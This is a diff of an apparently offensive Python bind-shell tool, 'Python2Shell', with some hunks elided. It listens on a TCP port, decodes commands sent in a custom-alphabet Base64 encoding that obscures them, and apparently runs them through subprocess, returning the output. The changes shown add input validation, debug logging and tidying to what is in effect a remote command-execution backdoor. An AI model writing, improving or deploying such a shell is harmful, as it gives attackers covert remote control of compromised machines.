@@ -1,16 +1,21 @@
-# Python2Shell v0.1 (LiquidSky)
 import os
 import socket
 import subprocess
 
 # Custom Base64 alphabet
 CUSTOM_ALPHABET = "~!@#$%^&*()_+=-0987654321`:;'{jKlMnOpQrStUvWxYzaBcDeFgHi,.<>?[]}"
-CUSTOM_ALPHABET_MAP = {char: idx for idx, char in enumerate(CUSTOM_ALPHABET)}
+CUSTOM_ALPHABET_MAP = {char: idx for idx, char in enumerate(CUSTOM_ALPHABET)}  # Global definition
 
 def custom_base64_decode(encoded: str) -> str:
-    """Custom Base64 decoding"""
-    # First, remove any padding (#) and ensure no invalid characters exist
-    encoded = encoded.rstrip('#')  # Remove padding
+    """Custom Base64 decoding."""
+    # Remove padding (#) if it exists
+    encoded = encoded.rstrip('#')
+    
+    # Ensure the encoded string is valid
+    if any(char not in CUSTOM_ALPHABET for char in encoded):
+        print(f"[*] Invalid characters found in encoded string: {encoded}")
+        return ""
+
     # Build the binary string by mapping each character to its binary equivalent
     binary_string = ''.join(f'{CUSTOM_ALPHABET_MAP[char]:06b}' for char in encoded if char in CUSTOM_ALPHABET_MAP)
     
@@ -23,28 +28,21 @@ def custom_base64_decode(encoded: str) -> str:
         print("[*] Warning: Null character detected in decoded command, skipping.")
         decoded = decoded.replace('\x00', '')  # Remove any null characters
     
+    print(f"[*] Decoded Command: {decoded}")  # Log the decoded command for debugging
     return decoded
 
 # Server details
-HOST = '0.0.0.0'  # The IP of the listener.
-PORT = 446              # The same port as listener.
+HOST = '0.0.0.0'  # Bind to all interfaces.
+PORT = 446         # The same port as listener.
 
 # Set up the server to listen for connections
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
 s.listen(1)
-s
-print('''
-█▄─▄▄─█▄─█─▄█─▄─▄─█─█─█─▄▄─█▄─▀█▄─▄█▀▄▄▀█─▄▄▄▄█─█─█▄─▄▄─█▄─▄███▄─▄███
-██─▄▄▄██▄─▄████─███─▄─█─██─██─█▄▀─███▀▄██▄▄▄▄─█─▄─██─▄█▀██─██▀██─██▀█
-▀▄▄▄▀▀▀▀▄▄▄▀▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀ v.01''')
-print("[*] Waiting for connection...\n")
+
+print("[*] Waiting for connection...")
 client_socket, client_address = s.accept()
-
-
 print(f"[*] Connection from {client_address}")
-
-
 
 while True:
     try:
@@ -58,7 +56,9 @@ while True:
 
         # Decode the custom Base64 encoded command
         command = custom_base64_decode(encoded_command)
-        print(f"[*] Decoded Command: {command}")  # Debug print
+        if not command:
+            print("[*] Failed to decode command. Closing connection.")
+            break
 
         # If the command is 'exit' or 'quit', break the loop and close the connection
         if command.lower() in ['exit', 'quit']:
@@ -77,11 +77,11 @@ while True:
         # Get the command output (stdout and stderr)
         stdout_value, stderr_value = proc.communicate()
 
-        # Ensure stdout and stderr are correctly decoded and handled as bytes
+        # Decode the stdout and stderr into strings for easier logging
         stdout_str = stdout_value.decode('utf-8', errors='ignore')
         stderr_str = stderr_value.decode('utf-8', errors='ignore')
 
-        # Print the outputs for debugging
+        # Log the outputs for debugging
         print(f"[*] stdout: {stdout_str}")
         print(f"[*] stderr: {stderr_str}")
 
